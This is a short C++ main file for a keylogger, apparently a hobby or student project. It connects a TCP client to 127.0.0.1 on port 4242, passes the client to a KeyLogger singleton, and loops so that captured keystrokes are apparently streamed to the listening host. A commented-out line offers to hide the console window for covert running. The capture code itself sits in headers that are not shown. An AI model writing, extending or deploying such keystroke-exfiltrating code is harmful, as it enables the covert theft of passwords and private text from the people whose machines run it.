#include <iostream>
#include "TCPClient.h"
#include "KeyLoger.hpp"

int main(int argc, char **argv)
{
	TCPClient client;

	client.connectToHost("127.0.0.1", "4242");
	KeyLogger::getInstance().setTCPClient(&client);
	//ShowWindow(GetConsoleWindow(), SW_HIDE); // Uncomment to hide console

	while (KeyLogger::getInstance().refreshNonBlocking())
	{

	}
	return 0;
}